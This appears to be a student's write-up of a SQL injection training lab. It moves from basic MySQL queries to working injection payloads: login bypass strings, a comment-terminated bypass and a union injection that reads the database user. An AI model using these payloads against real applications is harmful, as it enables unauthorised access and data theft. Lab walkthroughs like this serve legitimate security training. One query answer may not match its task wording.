<h1><ins>Intro to MySQL</ins></h1>
<h2>Task: Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?</h2>

![Screenshot 2024-12-03 203708](https://github.com/user-attachments/assets/5320c989-cf53-4e9b-ac38-27c8de4986fc)

<h1><ins>SQL Statements</ins></h1>
<h2>Task: What is the department number for the 'Development' department?</h2>
We use <code> use employees;</code> to select database then <code>show tables;</code> to see all tables, to find department number we use <code>select * from departments;</code>

![Screenshot 2024-12-03 204026](https://github.com/user-attachments/assets/cc2ddd1f-81d1-4feb-a1db-4efe83c38ecb)

<h1><ins>Query Results</ins></h1>
<h2>Task: What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?</h2>
We can use command <code>select * from employees where hire_date = "1990-01-01";</code> which give us only one result.

![Screenshot 2024-12-03 205310](https://github.com/user-attachments/assets/77f8127b-d93e-457d-8334-ffeb36386d0d)

<h1><ins>SQL Operators</ins></h1>
<h2>Task: In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?</h2>
We can use command <code>select * from titles where emp_no > 10000 OR title != 'engineer';</code>

![Screenshot 2024-12-03 210046](https://github.com/user-attachments/assets/848405f2-1be2-4bd6-9167-d040db935d7e)

<h1><ins>Subverting Query Logic</ins></h1>
<h2>Task: Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?</h2>
using <code>tom' or '1'='1</code> as username input we can bypass login with any password

![Screenshot 2024-12-03 211949](https://github.com/user-attachments/assets/354fa0c5-b1e6-4e5f-a37e-2c70df03a5e9)

<h1><ins>Using Comments</ins></h1>
<h2>Task: Login as the user with the id 5 to get the flag.</h2>
Using or statment and user that is very unlikely to exist we login with id 5 by using <code>blahblah' or id = 5)-- </code> as our input

![Screenshot 2024-12-03 213430](https://github.com/user-attachments/assets/21af8ee0-c8c3-4733-ba9c-cfc250f4dbd0)

<h1><ins>Union Clause</ins></h1>
<h2>Task: Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.</h2>
using <code>SELECT * FROM employees UNION SELECT dept_no, dept_name, 2, 3, 4, 5 from departments;</code> we get table of both connected tables.

![Screenshot 2024-12-03 214530](https://github.com/user-attachments/assets/fd988319-8d54-4c92-99b7-19279f5d14d3)

<h1><ins>Union Injection</ins></h1>
<h2>Task: Use a Union injection to get the result of 'user()</h2>
Using <code>cn' UNION select 1,user(),3,4-- -</code> we can find the user.

![Screenshot 2024-12-03 215514](https://github.com/user-attachments/assets/beebca7a-58d5-4125-aaa7-c329a3dd3d41)

<h1><ins>Database Enumeration</ins></h1>
<h2>Task: What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?</h2>

